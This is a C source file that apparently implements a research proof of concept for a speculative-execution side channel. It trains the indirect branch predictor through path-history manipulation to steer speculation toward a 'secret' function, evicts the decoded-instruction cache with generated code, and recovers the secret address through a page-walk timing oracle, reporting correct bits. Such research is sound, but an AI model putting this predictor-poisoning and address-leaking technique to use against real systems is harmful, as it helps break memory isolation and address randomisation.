#include "mapping.h"
#include "pwsc.h"
#include "util.h"
#include <time.h>

extern void set_phr(int value);
extern void shift_phr();
extern void clear_phr();

__attribute__((section(".secret_section"), used, noinline)) void
secret_function(void) {
  volatile int a = 5;
  return;
}

__attribute__((section(".noise_section"), used, noinline)) void
noise_function(void) {
  volatile int a = 5;
  return;
}

__attribute__((section(".signal_section"), used, noinline)) void
signal_function(void) {
  volatile int a = 5;
  return;
}

__attribute__((section(".victim_function_section"), noinline)) static void
victim_function(void *secret_ptr, uint64_t mask, int arch_exec) {
  if (arch_exec) {
    asm volatile("movq %0, %%rax\n\t"
                 "movq %1, %%rbx\n\t"
                 "andq %%rbx, %%rax\n\t"
                 "call *%%rax\n\t"
                 :
                 : "r"(secret_ptr), "r"(mask)
                 : "%rax", "%rbx", "%rcx", "%rdx");
  }
}

__attribute__((section(".victim_spy_section"), noinline)) static void
victim_spy(void *secret_ptr, uint64_t mask, int arch_exec) {
  asm volatile("nop\n\t");
  asm volatile("nop\n\t");
  asm volatile("nop\n\t");
  asm volatile("nop\n\t");
  asm volatile("nop\n\t");
  asm volatile("nop\n\t");
  asm volatile("nop\n\t");
  asm volatile("nop\n\t");
  asm volatile("nop\n\t");
  asm volatile("nop\n\t");
  asm volatile("nop\n\t");
  asm volatile("nop\n\t");
  asm volatile("nop\n\t");
  asm volatile("nop\n\t");
  asm volatile("nop\n\t");
  asm volatile("nop\n\t");
  if (arch_exec) {
    asm volatile("movq %0, %%rax\n\t"
                 "movq %1, %%rbx\n\t"
                 "andq %%rbx, %%rax\n\t"
                 "call *%%rax\n\t"
                 :
                 : "r"(secret_ptr), "r"(mask)
                 : "%rax", "%rbx", "%rcx", "%rdx");
  }
}

uint64_t setup_trigger(uint64_t target, uint64_t phase, uint64_t __trash) {
  (void)phase;
  int phr_value;

  for (int i = 0; i < 100; ++i) {
    victim_spy(signal_function, ~0x7fff000000000000,
               1); // Bias architectural execution to happen
  }

  // Train IBP
  for (int i = 0; i < 100; ++i) {
    clear_phr();
    phr_value = rand() % 2;
    set_phr(phr_value);
    if (phr_value)
      victim_function(signal_function, ~0x7fff000000000000, 1);
    else
      victim_function(noise_function, ~0x7fff000000000000, 1);
  }

  // Overwrite with secret function

  clear_phr();
  set_phr(1);
  victim_spy(secret_function, ~0x7fff000000000000, 0);

  clear_phr();
  set_phr(1);
  victim_spy(secret_function, ~0x7fff000000000000, 0);

  clear_phr();
  set_phr(1);
  victim_spy(secret_function, ~0x7fff000000000000, 0);

  clear_phr();
  set_phr(1);
  victim_spy(secret_function, ~0x7fff000000000000, 0);

  return __trash;
}

uint64_t trigger(uint64_t target, uint64_t phase, uint64_t __trash) {
  if (phase) {
    clear_phr();
    set_phr(1);
    victim_function(NULL, ~0x7fff000000000000, 0);
  }
  return __trash;
}

void evict_dsb(void) {
  typedef void (*fill_func)();

#define ITERATIONS 8192
#define INST_SIZE 6 // add rax, imm32

  // Encoding: 48 05 imm32
  // add rax, imm32
#define ADD_RAX_IMM32 "\x48\x05\x01\x00\x00\x00"

  size_t buffer_size = (ITERATIONS * INST_SIZE) + 1;

  void *buffer = mmap(NULL, buffer_size, PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

  if (buffer == MAP_FAILED) {
    perror("mmap");
    return;
  }

  unsigned char *ptr = (unsigned char *)buffer;

  for (int i = 0; i < ITERATIONS; i++) {
    memcpy(ptr, ADD_RAX_IMM32, INST_SIZE);
    ptr += INST_SIZE;
  }

  // return
  *ptr = 0xC3;

  // serialize frontend
  asm volatile("cpuid" ::: "rax", "rbx", "rcx", "rdx");

  ((fill_func)buffer)();

  asm volatile("cpuid" ::: "rax", "rbx", "rcx", "rdx");

  munmap(buffer, buffer_size);
}

int main(void) {
  // pin cpu
  pin_cpu(0);
  srand(time(0));

  evict_dsb();

  // Experiment setup
  fprintf(stderr, "Running simple test\n");
  fprintf(stderr, "Using the PWC order oracle\n");
  fprintf(stderr, "Architectural derefence\n");
  fprintf(stderr, "Fast configurations\n");
  pwsc_init_reset(setup_trigger, NULL, trigger, DEFAULT_EVICT_SIZES,
                  THRESHOLD_FAST, NUM_TRIALS_FAST);

  uint64_t val = *(uint64_t *)secret_function;
  printf("Secret function first 8 bytes: 0x%lx\n", val);
  asm volatile("" ::"r"(val) : "memory");

  fprintf(stderr,
          "Target Secret Value: 0x%lx\tTarget's VPNs + PO are %lu %lu %lu %lu "
          "%lu\n",
          (uint64_t)secret_function,
          VPN4_TO_CACHE_LINE((uint64_t *)secret_function),
          VPN3_TO_CACHE_LINE((uint64_t *)secret_function),
          VPN2_TO_CACHE_LINE((uint64_t *)secret_function),
          VPN1_TO_CACHE_LINE((uint64_t *)secret_function),
          PO_TO_CACHE_LINE((uint64_t *)secret_function));
  fprintf(stderr, "\n\n\n");

  // Run the PWSC
  struct pwsc_ans ans = run_pwsc((uint64_t)signal_function);

  // Stats
  int correct_bits = bit_accuracy_checker(ans.va.va, (uint64_t)secret_function);
  fprintf(stderr,
          "\nRecovered Secret Value: 0x%lx\tRecovered VPNs + PO are %lu %lu "
          "%lu %lu %lu\n",
          (uint64_t)ans.va.va, VPN4_TO_CACHE_LINE(ans.va.va),
          VPN3_TO_CACHE_LINE(ans.va.va), VPN2_TO_CACHE_LINE(ans.va.va),
          VPN1_TO_CACHE_LINE(ans.va.va), PO_TO_CACHE_LINE(ans.va.va));
  fprintf(stderr, "Correct bits: %d\tImprovement Over Random: %d\n",
          correct_bits, correct_bits - 32);
}
